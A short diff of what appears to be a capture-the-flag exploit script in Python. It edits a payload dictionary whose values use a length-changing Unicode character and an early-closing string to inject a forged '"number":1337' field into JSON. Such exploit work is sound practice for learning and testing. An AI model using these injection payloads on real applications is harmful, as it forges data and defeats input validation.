@@ -163,7 +163,7 @@ data = {
     'name' : 'name',
     'image': 'image',
     'favorite_key' : chr(304) * 64,
-    'favorite_value': '","number":1337,"a":"' + chr(304) * (64 - len('","number":1337,"a":"')),
+    'favorite_value': '","number":1337,"a":"' + 'a' * (64 - len('","number":1337,"a":"')),
     'word' : chr(304) * 22 + 'aaa"}',
     'number': 11,
     'bio' : 'bio'
